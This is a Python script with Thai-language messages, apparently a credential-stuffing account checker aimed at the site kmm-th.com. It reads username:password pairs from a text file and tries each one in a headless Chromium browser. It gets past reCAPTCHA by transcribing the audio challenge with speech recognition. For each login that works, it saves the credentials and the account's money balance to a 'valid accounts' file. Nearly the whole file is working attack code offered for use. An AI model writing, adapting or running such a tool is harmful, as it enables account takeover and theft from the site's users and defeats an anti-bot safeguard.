import os
import urllib.request
import random
import time
from typing import Optional
import pydub
import speech_recognition as sr
from colorama import Fore, Style, init
from DrissionPage import ChromiumPage, ChromiumOptions
import sys
import shutil

# Initialize colorama
init(autoreset=True)

# Configuration
INPUT_FILE = 'msd.txt'
OUTPUT_FILE = 'valid_accounts.txt'

# --- Config Browser Path ---
# หากรันแล้วไม่เจอ Browser ให้ใส่ path ของ chrome.exe ที่นี่
# ตัวอย่าง Windows: r"C:\Program Files\Google\Chrome\Application\chrome.exe"
# ตัวอย่าง Linux/Mac: "/usr/bin/google-chrome"
BROWSER_PATH = "" 

# --- RecaptchaSolver Class ---
class RecaptchaSolver:
    """A class to solve reCAPTCHA challenges using audio recognition."""

    # Constants
    TEMP_DIR = os.getenv("TEMP") if os.name == "nt" else "/tmp"
    TIMEOUT_STANDARD = 7
    TIMEOUT_SHORT = 1
    TIMEOUT_DETECTION = 0.05

    def __init__(self, driver: ChromiumPage) -> None:
        self.driver = driver

    def solveCaptcha(self) -> None:
        """Attempt to solve the reCAPTCHA challenge."""
        
        # Check if reCAPTCHA exists
        if not self.driver.ele("@title=reCAPTCHA"):
             if not self.driver.ele("xpath://iframe[contains(@src, 'recaptcha')]"):
                 return

        try:
            self.driver.wait.ele_displayed("@title=reCAPTCHA", timeout=self.TIMEOUT_STANDARD)
            time.sleep(0.1)
            iframe_inner = self.driver("@title=reCAPTCHA")

            # Click the checkbox
            iframe_inner.wait.ele_displayed(".rc-anchor-content", timeout=self.TIMEOUT_STANDARD)
            iframe_inner(".rc-anchor-content", timeout=self.TIMEOUT_SHORT).click()
        except:
            pass

        if self.is_solved():
            return

        # Handle audio challenge
        iframe = self.driver("xpath://iframe[contains(@title, 'recaptcha challenge')]")
        if not iframe:
             iframe = self.driver("xpath://iframe[contains(@src, 'bframe')]")
        
        if not iframe:
            return

        try:
            iframe.wait.ele_displayed("#recaptcha-audio-button", timeout=self.TIMEOUT_STANDARD)
            iframe("#recaptcha-audio-button", timeout=self.TIMEOUT_SHORT).click()
            time.sleep(0.3)

            if self.is_detected():
                raise Exception("Captcha detected bot behavior")

            iframe.wait.ele_displayed("#audio-source", timeout=self.TIMEOUT_STANDARD)
            src = iframe("#audio-source").attrs["src"]

            text_response = self._process_audio_challenge(src)
            iframe("#audio-response").input(text_response.lower())
            iframe("#recaptcha-verify-button").click()
            time.sleep(0.4)

            if not self.is_solved():
                raise Exception("Failed to solve the captcha")

        except Exception as e:
            pass

    def _process_audio_challenge(self, audio_url: str) -> str:
        mp3_path = os.path.join(self.TEMP_DIR, f"{random.randrange(1,1000)}.mp3")
        wav_path = os.path.join(self.TEMP_DIR, f"{random.randrange(1,1000)}.wav")

        try:
            urllib.request.urlretrieve(audio_url, mp3_path)
            sound = pydub.AudioSegment.from_mp3(mp3_path)
            sound.export(wav_path, format="wav")

            recognizer = sr.Recognizer()
            with sr.AudioFile(wav_path) as source:
                audio = recognizer.record(source)

            return recognizer.recognize_google(audio)

        finally:
            for path in (mp3_path, wav_path):
                if os.path.exists(path):
                    try:
                        os.remove(path)
                    except OSError:
                        pass

    def is_solved(self) -> bool:
        try:
            iframe = self.driver("@title=reCAPTCHA")
            return "style" in iframe.ele(".recaptcha-checkbox-checkmark", timeout=self.TIMEOUT_SHORT).attrs
        except Exception:
            return False

    def is_detected(self) -> bool:
        try:
            return self.driver.ele("Try again later", timeout=self.TIMEOUT_DETECTION).states().is_displayed
        except Exception:
            return False

    def get_token(self) -> Optional[str]:
        try:
            return self.driver.ele("#recaptcha-token").attrs["value"]
        except Exception:
            return None

# --- Main Logic ---

def save_success(username, password, balance):
    with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
        f.write(f"ชื่อ: {username}\n")
        f.write(f"รหัสผ่าน: {password}\n")
        f.write(f"ยอดเงิน: {balance}\n")
        f.write("--------------------------\n")

def check_account(driver, username, password):
    try:
        driver.get('https://kmm-th.com/')
        driver.delete_all_cookies()
        
        if not driver.wait.ele_displayed('#username', timeout=10):
             print(f"{Fore.RED}❌ โหลดหน้าเว็บไม่สำเร็จ | {username}")
             return

        driver.ele('#username').input(username)
        driver.ele('#password').input(password)
        
        solver = RecaptchaSolver(driver)
        solver.solveCaptcha()
        
        btn = driver.ele('css:button[type="submit"]')
        if btn:
            btn.click()
        
        if driver.wait.ele_displayed('.stats-number', timeout=10):
            balance_ele = driver.ele('.stats-number')
            balance = balance_ele.text
            
            print(f"{Fore.GREEN}✅ เข้าสู่ระบบสำเร็จ")
            print(f"{Fore.CYAN}👤 ชื่อ: {username}")
            print(f"{Fore.CYAN}🔑 รหัสผ่าน: {password}")
            print(f"{Fore.YELLOW}💰 ยอดเงิน: {balance}")
            print(f"{Fore.MAGENTA}--------------------------")
            
            save_success(username, password, balance)
        else:
            print(f"{Fore.RED}❌ เข้าสู่ระบบไม่สำเร็จ (รหัสผิด/Captcha) | {username}")

    except Exception as e:
        print(f"{Fore.RED}⚠️ Error checking {username}: {str(e)}")

def find_browser_path():
    """Try to find chrome/chromium executable automatically."""
    if BROWSER_PATH and os.path.exists(BROWSER_PATH):
        return BROWSER_PATH
        
    # Common paths for different OS
    paths = []
    
    # Termux (Android)
    paths.extend([
        "/data/data/com.termux/files/usr/bin/chromium",
        "/data/data/com.termux/files/usr/bin/chromium-browser",
        "/data/data/com.termux/files/usr/bin/google-chrome",
    ])
    
    # Linux (Replit environment usually uses 'chromium')
    paths.extend([
        "/usr/bin/google-chrome",
        "/usr/bin/chromium",
        "/usr/bin/chromium-browser",
        "/usr/bin/google-chrome-stable",
        "/snap/bin/chromium",
        "/var/lib/flatpak/exports/bin/org.chromium.Chromium",
        shutil.which("chromium"),
        shutil.which("google-chrome"),
        shutil.which("chromium-browser"),
    ])
    
    # Windows
    if os.name == 'nt':
        paths.extend([
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
            os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe"),
            os.path.expandvars(r"%PROGRAMFILES%\Google\Chrome\Application\chrome.exe"),
            os.path.expandvars(r"%PROGRAMFILES(X86)%\Google\Chrome\Application\chrome.exe"),
        ])
    
    # Mac
    paths.extend([
        "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
        "/Applications/Chromium.app/Contents/MacOS/Chromium",
    ])
    
    for path in paths:
        if path and os.path.exists(path):
            return path
            
    return None

def main():
    CHROME_ARGUMENTS = [
        "-no-first-run",
        "-force-color-profile=srgb",
        "-metrics-recording-only",
        "-password-store=basic",
        "-use-mock-keychain",
        "-export-tagged-pdf",
        "-no-default-browser-check",
        "-disable-background-mode",
        "-enable-features=NetworkService,NetworkServiceInProcess",
        "-disable-features=FlashDeprecationWarning",
        "-deny-permission-prompts",
        "-disable-gpu",
        "-accept-lang=en-US",
        "--disable-usage-stats",
        "--disable-crash-reporter",
        "--no-sandbox",
        "--headless=new"
    ]
    
    options = ChromiumOptions()
    for argument in CHROME_ARGUMENTS:
        options.set_argument(argument)
        
    # Auto-detect or use configured path
    browser_path = find_browser_path()
    if browser_path:
        # print(f"{Fore.BLUE}ℹ️ พบเบราว์เซอร์ที่: {browser_path}")
        options.set_paths(browser_path=browser_path)
    
    try:
        driver = ChromiumPage(addr_or_opts=options)
    except Exception as e:
        print(f"{Fore.RED}❌ เกิดข้อผิดพลาดร้ายแรง: ไม่สามารถเปิดเบราว์เซอร์ได้")
        print(f"{Fore.YELLOW}คำแนะนำ:")
        print(f"1. โปรดติดตั้ง Google Chrome หรือ Chromium ในเครื่องของท่าน")
        print(f"2. หากติดตั้งแล้วยังไม่ได้ ให้แก้ไขบรรทัดที่ 16 ในไฟล์นี้")
        print(f"   ใส่ที่อยู่ของไฟล์ chrome.exe ลงในตัวแปร BROWSER_PATH")
        print(f"   เช่น: BROWSER_PATH = r\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"")
        print(f"\nError Details: {e}")
        return

    if not os.path.exists(INPUT_FILE):
        print(f"{Fore.RED}ไม่พบไฟล์ {INPUT_FILE}")
        return

    with open(INPUT_FILE, 'r', encoding='utf-8') as f:
        lines = f.readlines()

    for line in lines:
        line = line.strip()
        if not line: continue
        
        u, p = None, None
        if ':' in line:
            parts = line.split(':')
            if len(parts) >= 2: u, p = parts[0], parts[1]
        elif '|' in line:
            parts = line.split('|')
            if len(parts) >= 2: u, p = parts[0], parts[1]
            
        if u and p:
            check_account(driver, u, p)
    
    driver.quit()

if __name__ == "__main__":
    main()
